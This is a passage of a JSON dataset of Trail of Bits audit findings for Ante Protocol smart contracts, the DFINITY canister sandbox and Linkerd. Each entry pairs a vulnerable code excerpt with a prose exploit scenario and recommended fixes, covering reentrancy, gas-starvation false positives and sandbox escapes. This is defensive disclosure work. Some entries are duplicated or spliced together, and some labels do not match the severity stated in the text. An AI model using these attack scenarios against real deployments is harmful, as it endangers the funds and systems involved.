        "description": "The AntePoolFactory uses the create2 instruction to deploy an AntePool and then initializes it with an already-deployed AnteTest address. However, the AntePoolFactory does not validate the address returned by create2, which will be the zero address if the deployment operation fails. bytes memory bytecode = type(AntePool).creationCode; bytes32 salt = keccak256(abi.encodePacked(testAddr)); assembly { testPool := create2(0, add(bytecode, 0x20), mload(bytecode), salt) } poolMap[testAddr] = testPool; allPools.push(testPool); AntePool(testPool).initialize(anteTest); emit AntePoolCreated(testAddr, testPool); Figure 1.1: contracts/AntePoolFactory.sol#L35-L47 This lack of validation does not currently pose a problem, because the simplicity of AntePool contracts helps prevent deployment failures (and thus the return of the zero address). However, deployment issues could become more likely in future iterations of the Ante Protocol. Recommendations Short term, have the AntePoolFactory check the address returned by the create2 operation against the zero address. Long term, ensure that the results of operations that return a zero address in the event of a failure (such as create2 and ecrecover operations) are validated appropriately.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Events emitted during critical operations omit certain details ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "description": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure. 3. Insu\u0000cient gas can cause AnteTests to produce false positives Severity: High Diculty: High Type: Data Validation Finding ID: TOB-ANTE-3 Target: contracts/AntePool.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. Looping over an array of unbounded size can cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "description": "If an AnteTest fails, the _checkTestNoRevert function will return false, causing the checkTest function to call _calculateChallengerEligibility to compute eligibleAmount; this value is the total stake of the eligible challengers and is used to calculate the proportion of _remainingStake owed to each challenger. To calculate eligibleAmount, the _calculateChallengerEligibility function loops through an unbounded array of challenger addresses. When the number of challengers is large, the function will consume a large quantity of gas in this operation. function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 4.1: contracts/AntePool.sol#L553-L563 However, triggering an out-of-gas error would be costly to an attacker; the attacker would need to create many accounts through which to stake funds, and the amount of each stake would decay over time. Exploit Scenario The length of the challenger address array grows such that the computation of the eligibleAmount causes the block to reach its gas limit. Then, because of this Ethereum-imposed gas constraint, the entire transaction reverts, and the failing AnteTest is not marked as failing. As a result, challengers who have staked funds in anticipation of a failed test will not receive a payout. Recommendations Short term, determine the number of challengers that can enter an AntePool without rendering the _calculateChallengerEligibility functions operation too gas intensive; then, use that number as the upper limit on the number of challengers. Long term, avoid calculating every challengers proportion of _remainingStake in the same operation; instead, calculate each user's pro-rata share when he or she enters the pool and modify the challenger delay to require that a challenger register and wait 12 blocks before minting his or her pro-rata share. Upon a test failure, a challenger would burn these shares and redeem them for ether.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Events emitted during critical operations omit certain details ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "description": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. Insu\u0000cient gas can cause AnteTests to produce false positives ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "description": "Once challengers have staked ether and the challenger delay has passed, they can submit transactions to predict that a test will fail and to earn a bonus if it does. An attacker could manipulate the result of an AnteTest by providing a limited amount of gas to the checkTest function, forcing the test to fail. This is because the anteTest.checkTestPasses function receives 63/64 of the gas provided to checkTest (per the 63/64 gas forwarding rule), which may not be enough. This issue stems from the use of a try-catch statement in the _checkTestNoRevert function, which causes the function to return false when an EVM exception occurs, indicating a test failure. We set the diculty of this nding to high, as the outer call will also revert with an out-of-gas exception if it requires more than 1/64 of the gas; however, other factors (e.g., the block gas limit) may change in the future, allowing for a successful exploitation. if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); Figure 3.1: Part of the checkTest function /// @return passes bool if the Ante Test passed function _checkTestNoRevert() internal returns (bool) { try anteTest.checkTestPasses() returns (bool passes) { return passes; } catch { return false; } } Figure 3.2: contracts/AntePool.sol#L567-L573 Exploit Scenario An attacker calculates the amount of gas required for checkTest to run out of gas in the inner call to anteTest.checkTestPasses. The test fails, and the attacker claims the verier bonus. Recommendations Short term, ensure that the AntePool reverts if the underlying AnteTest does not have enough gas to return a meaningful value. Long term, redesign the test verication mechanism such that gas usage does not cause false positives.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Reentrancy into AntePool.checkTest scales challenger eligibility amount ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "description": "A malicious AnteTest or underlying contract being tested can trigger multiple failed checkTest calls by reentering the AntePool.checkTest function. With each call, the _calculateChallengerEligibility method increases the eligibleAmount instead of resetting it, causing the eligibleAmount to scale unexpectedly with each reentrancy. function checkTest() external override testNotFailed { require(challengers.exists(msg.sender), \"ANTE: Only challengers can checkTest\"); require( block.number.sub(eligibilityInfo.lastStakedBlock[msg.sender]) > CHALLENGER_BLOCK_DELAY, \"ANTE: must wait 12 blocks after challenging to call checkTest\" ); numTimesVerified = numTimesVerified.add(1); lastVerifiedBlock = block.number; emit TestChecked(msg.sender); if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); emit FailureOccurred(msg.sender); } } Figure 5.1: contracts/AntePool.sol#L292-L316 function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 5.2: contracts/AntePool.sol#L553-L563 Appendix D includes a proof-of-concept AnteTest contract and hardhat unit test that demonstrate this issue. Exploit Scenario An attacker deploys an AnteTest contract or a vulnerable contract to be tested. The attacker directs the deployed contract to call AntePool.stake, which registers the contract as a challenger. The malicious contract then reenters AntePool.checkTest and triggers multiple failures within the same call stack. As a result, the AntePool makes multiple calls to the _calculateChallengerEligibility method, which increases the challenger eligibility amount with each call. This results in a greater-than-expected loss of pool funds. Recommendations Short term, implement checks to ensure the AntePool contracts methods cannot be reentered while checkTest is executing. Long term, ensure that all calls to external contracts are reviewed for reentrancy risks. To prevent a reentrancy from causing undened behavior in the system, ensure state variables are updated in the appropriate order; alternatively (and if sensible) disallow reentrancy altogether. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. The canister sandbox has vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "The canister sandbox codebase uses the following vulnerable or unmaintained Rust dependencies. (All of the crates listed are indirect dependencies of the codebase.) Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Complete environment of the replica is passed to the sandboxed process ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "When the spawn_socketed_process function spawns a new sandboxed process, the call to the Command::spawn method passes the entire environment of the replica to the sandboxed process. pub fn spawn_socketed_process( exec_path: &str, argv: &[String], socket: RawFd, ) -> std::io::Result<Child> { let mut cmd = Command::new(exec_path); cmd.args(argv); // In case of Command we inherit the current process's environment. This should // particularly include things such as Rust backtrace flags. It might be // advisable to filter/configure that (in case there might be information in // env that the sandbox process should not be privy to). // The following block duplicates sock_sandbox fd under fd 3, errors are // handled. unsafe { cmd.pre_exec(move || { let fd = libc::dup2(socket, 3); if fd != 3 { return Err(std::io::Error::last_os_error()); } Ok(()) }) }; let child_handle = cmd.spawn()?; Ok(child_handle) } Figure 2.1: canister_sandbox/common/src/process.rs:17- The DFINITY team does not use environment variables for sensitive information. However, sharing the environment with the sandbox introduces a latent risk that system conguration data or other sensitive data could be leaked to the sandboxed process in the future. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. Since the environment of the replica was leaked to the sandbox when the process was created, the canister gains information about the system that it is running on and learns sensitive information passed as environment variables to the replica, making further eorts to compromise the system easier. Recommendations Short term, add code that lters the environment passed to the sandboxed process (e.g., Command::env_clear or Command::env_remove) to ensure that no sensitive information is leaked if the sandbox is compromised.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. SELinux policy allows the sandbox process to write replica log messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "When a new sandboxed process is spawned using Command::spawn, the processs stdin, stdout, and stderr le descriptors are inherited from the parent process. The SELinux policy for the canister sandbox currently allows sandboxed processes to read from and write to all le descriptors inherited from the replica (the le descriptors created by init when the replica is started, as well as the le descriptor used for interprocess RPC). As a result, a compromised sandbox could spoof log messages to the replica's stdout or stderr. # Allow to use the logging file descriptor inherited from init. # This should actually not be allowed, logs should be routed through # replica. allow ic_canister_sandbox_t init_t : fd { use }; allow ic_canister_sandbox_t init_t : unix_stream_socket { read write }; Figure 3.1: guestos/rootfs/prep/ic-node/ic-node.te:312-316 Additionally, sandboxed processes read and write access to les with the tmpfs_t context appears to be overly broad, but considering the fact that sandboxed processes are not allowed to open les, we did not see any way to exploit this. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By writing fake log messages to the replicas stderr le descriptor, the canister makes it look like the replica has other issues, masking the compromise and making incident response more dicult. Recommendations Short term, change the SELinux policy to disallow sandboxed processes from reading from and writing to the inherited le descriptors stdin, stdout, and stderr.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Canister sandbox system calls are not ltered using Seccomp ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "Seccomp provides a framework to lter outgoing system calls. Using Seccomp, a process can limit the type of system calls available to it, thereby limiting the available attack surface of the kernel. The current implementation of the canister sandbox does not use Seccomp; instead, it relies on mandatory access controls (via SELinux) to restrict the system calls available to a sandboxed process. While SELinux is useful for restricting access to les, directories, and other processes, Seccomp provides more ne-grained control over kernel system calls and their arguments. For this reason, Seccomp (in particular, Seccomp-BPF) is a useful complement to SELinux in restricting a sandboxed processs access to the system. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By exploiting a vulnerability in the kernel, it is able to break out of the sandbox and execute arbitrary code on the node. Recommendations Long term, consider using Seccomp-BPF to restrict the system calls available to a sandboxed process. Extra care must be taken when the canister sandbox (or any of its dependencies) is updated to ensure that the set of system calls invoked during normal execution has not changed.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Invalid system state changes cause the replica to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "When a sandboxed process has completed an execution request, the hypervisor calls SystemStateChanges::apply_changes (in Hypervisor::execute) to apply the system state changes to the global canister system state. pub fn apply_changes(self, system_state: &mut SystemState) { // Verify total cycle change is not positive and update cycles balance. assert!(self.cycle_change_is_valid( system_state.canister_id == CYCLES_MINTING_CANISTER_ID )); self.cycles_balance_change .apply_ref(system_state.balance_mut()); // Observe consumed cycles. system_state .canister_metrics .consumed_cycles_since_replica_started += NominalCycles::from_cycles(self.cycles_consumed); // Verify we don't accept more cycles than are available from each call // context and update each call context balance if !self.call_context_balance_taken.is_empty() { let call_context_manager = system_state.call_context_manager_mut().unwrap(); for (context_id, amount_taken) in &self.call_context_balance_taken { let call_context = call_context_manager .call_context_mut(*context_id) .expect(\"Canister accepted cycles from invalid call context\"); call_context .withdraw_cycles(*amount_taken) .expect(\"Canister accepted more cycles than available ...\"); } } // Push outgoing messages. for msg in self.requests { system_state .push_output_request(msg) .expect(\"Unable to send new request\"); } // Verify new certified data isn't too long and set it. if let Some(certified_data) = self.new_certified_data.as_ref() { assert!(certified_data.len() <= CERTIFIED_DATA_MAX_LENGTH as usize); system_state.certified_data = certified_data.clone(); } // Verify callback ids and register new callbacks. for update in self.callback_updates { match update { CallbackUpdate::Register(expected_id, callback) => { let id = system_state .call_context_manager_mut() .unwrap() .register_callback(callback); assert_eq!(id, expected_id); } CallbackUpdate::Unregister(callback_id) => { let _callback = system_state .call_context_manager_mut() .unwrap() .unregister_callback(callback_id) .expect(\"Tried to unregister callback with an id ...\"); } } } } Figure 5.1: system_api/src/sandbox_safe_system_state.rs:99-157 The apply_changes method uses assert and expect to ensure that system state invariants involving cycle balances, call contexts, and callback updates are upheld. By sending a WebAssembly (Wasm) execution output with invalid system state changes, a compromised sandboxed process could use this to cause the replica to panic. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister sends a Wasm execution output message containing invalid state changes to the replica, which causes the replica process to panic, crashing the entire subnet. Recommendations Short term, revise SystemStateChanges::apply_changes so that it returns an error if the system state changes from a sandboxed process are found to be invalid. Long term, audit the codebase for the use of panicking functions and macros like assert, unreachable, unwrap, or expect in code that validates data from untrusted sources.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. SandboxedExecutionController does not enforce memory size invariants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "description": "When a sandboxed process has completed an execution request, the execution state is updated by the SandboxedExecutionController::process method with the data from the execution output. // Unless execution trapped, commit state (applying execution state // changes, returning system state changes to caller). let system_state_changes = if exec_output.wasm.wasm_result.is_ok() { if let Some(state_modifications) = exec_output.state { // TODO: If a canister has broken out of wasm then it might have allocated // more wasm or stable memory than allowed. We should add an additional // check here that the canister is still within its allowed memory usage. execution_state .wasm_memory .page_map .deserialize_delta(state_modifications.wasm_memory.page_delta); execution_state.wasm_memory.size = state_modifications.wasm_memory.size; execution_state.wasm_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_wasm_memory_id), ); execution_state .stable_memory .page_map .deserialize_delta(state_modifications.stable_memory.page_delta); execution_state.stable_memory.size = state_modifications.stable_memory.size; execution_state.stable_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_stable_memory_id), ); // ... <redacted> state_modifications.system_state_changes } else { SystemStateChanges::default() } } else { SystemStateChanges::default() }; Figure 6.1: replica_controller/src/sandboxed_execution_controller.rs:663 However, the code does not validate the Wasm and stable memory sizes against the corresponding page maps. This means that a compromised sandbox could report a Wasm or stable memory size of 0 along with a non-empty page map. Since these memory sizes are used to calculate the total memory used by the canister in ExecutionState::memory_usage, this lack of validation could allow the canister to use up cycles normally reserved for memory use. pub fn memory_usage(&self) -> NumBytes { // We use 8 bytes per global. let globals_size_bytes = 8 * self.exported_globals.len() as u64; let wasm_binary_size_bytes = self.wasm_binary.binary.len() as u64; num_bytes_try_from(self.wasm_memory.size) .expect(\"could not convert from wasm memory number of pages to bytes\") + num_bytes_try_from(self.stable_memory.size) .expect(\"could not convert from stable memory number of pages to bytes\") + NumBytes::from(globals_size_bytes) + NumBytes::from(wasm_binary_size_bytes) } Figure 6.2: replicated_state/src/canister_state/execution_state.rs:411421 Canister memory usage aects how much the cycles account manager charges the canister for resource allocation. If the canister uses best-eort memory allocation, the implementation calls through to ExecutionState::memory_usage to compute how much memory the canister is using. pub fn charge_canister_for_resource_allocation_and_usage( &self, log: &ReplicaLogger, canister: &mut CanisterState, duration_between_blocks: Duration, ) -> Result<(), CanisterOutOfCyclesError> { let bytes_to_charge = match canister.memory_allocation() { // The canister has explicitly asked for a memory allocation. MemoryAllocation::Reserved(bytes) => bytes, // The canister uses best-effort memory allocation. MemoryAllocation::BestEffort => canister.memory_usage(self.own_subnet_type), }; if let Err(err) = self.charge_for_memory( &mut canister.system_state, bytes_to_charge, duration_between_blocks, ) { } // ... <redacted> // ... <redacted> } Figure 6.3: cycles_account_manager/src/lib.rs:671 Thus, if a sandboxed process reports a lower memory usage, the cycles account manager will charge the canister less than it should. It is unclear whether this represents expected behavior when a canister breaks out of the Wasm execution environment. Clearly, if the canister is able to execute arbitrary code in the context of a sandboxed process, then the replica has lost all ability to meter and restrict canister execution, which means that accounting for canister cycle and memory use is largely meaningless. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister reports the wrong memory sizes back to the replica with the execution output. This causes the cycles account manager to miscalculate the remaining available cycles for the canister in the charge_canister_for_resource_allocation_and_usage method. Recommendations Short term, document this behavior and ensure that implicitly trusting the canister output could not adversely aect the replica or other canisters running on the system. Consider enforcing the correct invariants for memory allocations reported by a sandboxed process. The following invariant should always hold for Wasm and stable memory: page_map_size <= memory.size <= MAX_SIZE page_map_size could be computed as memory.page_map.num_host_pages() * PAGE_SIZE.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of rate-limiting mechanisms in the identity service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The identity service issues signed certicates to sidecar proxies within Linkerd-integrated infrastructure. When proxies initialize for the rst time, they request a certicate from the identity service. However, the identity service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks. Because identity controllers are shared among pods in a cluster, a denial of service of an identity controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the identity service, the proxy can now repeatedly request a newly signed certicate as if it were a proxy sidecar initializing for the rst time. Recommendations Short term, add rate-limiting mechanisms to the identity service to prevent a single pod from requesting too many certicates or performing other computationally intensive actions. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 33 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of rate-limiting mechanisms in the destination service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The destination service contains trac-routing information for sidecar proxies within Linkerd-integrated infrastructure. However, the destination service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks if a pod repeatedly changes its availability status. Because destination controllers are shared among pods in a cluster, a denial of service of a destination controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the destination service, the proxy can now repeatedly request routing information or change its availability status to force updates in the controller. Recommendations Short term, add rate-limiting mechanisms to the destination service to prevent a single pod from requesting too much routing information or performing state updates too quickly. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 34 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model 4. Exposure of admin endpoint may a\u0000ect application availability Severity: Medium Diculty: Medium Type: Awareness and Training Finding ID: TOB-LKDTM-4 Target: linkerd-proxy",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Gos pprof endpoints enabled by default in all admin servers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "All core components of the Linkerd infrastructure, in both the data and control planes, have an admin server with Gos server runtime proler (pprof) endpoints on /debug/pprof enabled by default. These servers are not exposed to the rest of the cluster or to the local network by default. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers that an operator forwarded the admin server port to the local network, exposing the pprof endpoints to the local network. He connects a proler to it and gains access to debug information, which assists him in mounting further attacks. Recommendations Short term, add a check to http.go that enables pprof endpoints only when Linkerd runs in debug or test mode. Long term, audit all debug-related functionality to ensure it is not exposed when Linkerd is running in production mode. References  Your pprof is showing: IPv4 scans reveal exposed net/http/pprof endpoints 37 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Lack of access controls on the linkerd-viz dashboard ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "Linkerd operators can enable a set of metrics-focused features by adding the linkerd-viz extension. Doing so enables a web UI dashboard that lists detailed information about the namespaces, services, pods, containers, and other resources in a Kubernetes cluster in which Linkerd is congured. Operators can enable Kubernetes role-based access controls to the dashboard; however, no access control options are provided by Linkerd. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers an exposed UI dashboard. By accessing the dashboard, she gains valuable insight into the cluster. She uses the knowledge gained from exploring the dashboard to formulate attacks that would expand her access to the network. Recommendations Short term, document recommendations for restructuring access to the linkerd-viz dashboard. Long term, add authentication and authorization controls for accessing the dashboard. This could be done by implementing tokens created via the CLI or client-side authorization logic. 38 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Prometheus endpoints reachable from the user application namespace ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. Metrics can include various labels with IP addresses, pod IDs, and port numbers. Threat Scenario An attacker gains access to a user application pod and calls the API directly to read Prometheus metrics. He uses the API to gain information about the cluster that aids him in expanding his access across the Kubernetes infrastructure. Recommendations Short term, disallow access to the Prometheus extension from the user application namespace. This could be done in the same manner in which access to the web dashboard is restricted from within the cluster (e.g., by allowing access only for specic hosts). 39 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Lack of egress access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "Linkerd provides access control mechanisms for ingress trac but not for egress trac. Egress controls would allow an operator to impose important restrictions, such as which external services and endpoints that a meshed application running in the application namespace can communicate with. Threat Scenario A user application becomes compromised. As a result, the application code begins making outbound requests to malicious endpoints. The lack of access controls on egress trac prevents infrastructure operators from mitigating the situation (e.g., by allowing the application to communicate with only a set of allowlisted external services). Recommendations Short term, add support for enforcing egress network policies. A GitHub issue to implement this recommendation already exists in the Linkerd repository. 40 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Prometheus endpoints are unencrypted and unauthenticated by default ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. However, this endpoint is unencrypted and unauthenticated, lacking access and condentiality controls entirely. Threat Scenario An attacker gains access to a sibling component within the same namespace in which the Prometheus endpoint exists. Due to the lack of access controls, the attacker can now laterally obtain Prometheus metrics with ease. Additionally, due to the lack of condentiality controls, such as those implemented through the use of cryptography, connections are exposed to other parties. Recommendations Short term, consider implementing access controls within Prometheus and Kubernetes to disallow access to the Prometheus metrics endpoint from any machine within the cluster that is irrelevant to Prometheus logging. Additionally, implement secure encryption of connections with the use of TLS within Prometheus or leverage existing Linkerd mTLS schemes. 41 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Shared identity and destination services in a cluster poses risks to multi-application clusters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The identity and destination controllers are meant to convey certicate and routing information for proxies, respectively. However, only one identity controller and one destination controller are deployed in a cluster, so they are shared among all application pods within a cluster. As a result, a single application pod could pollute records, causing denial-of-service attacks or otherwise compromising these cluster-wide components. Additionally, a compromise of these cluster-wide components may result in the exposure of routing information for each application pod. Although the Kubernetes API server is exposed with the same architecture, it may be benecial to minimize the attack surface area and the data that can be exltrated from compromised Linkerd components. Threat Scenario An attacker gains access to a single user application pod and begins to launch attacks against the identity and destination services. As a result, these services cannot serve other user application pods. The attacker later nds a way to compromise one of these two services, allowing her to leak sensitive application trac from other user application pods. Recommendations Short term, implement per-pod identity and destination services that are isolated from other pods. If this is not viable, consider documenting this caveat so that users are aware of the risks of hosting multiple applications within a single cluster. 42 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of isolation between components and their sidecar proxies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "Within the Linkerd, linkerd-viz, and user application namespaces, each core component lives alongside a linkerd-proxy container, which proxies the components trac and provides mTLS for internal connections. However, because the sidecar proxies are not isolated from their corresponding components, the compromise of a component would mean the compromise of its proxy, and vice versa. This is particularly interesting when considering the lack of access controls for some components, as detailed in TOB-LKDTM-4: proxy admin endpoints are exposed to the applications they are proxying, allowing metrics collection and shutdown requests to be made. Threat Scenario An attacker exploits a vulnerability to gain access to a linkerd-proxy instance. As a result, the attacker is able to compromise the condentiality, integrity, and availability of lateral components, such as user applications, identity and destination services within the Linkerd namespace, and extensions within the linkerd-proxy namespace. Recommendations Short term, document system caveats and sensitivities so that operators are aware of them and can better defend themselves against attacks. Consider employing health checks that verify the integrity of proxies and other components to ensure that they have not been compromised. Long term, investigate ways to isolate sidecar proxies from the components they are proxying (e.g., by setting stricter access controls or leveraging isolated namespaces between proxied components and their sidecars). 43 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Lack of centralized security best practices documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
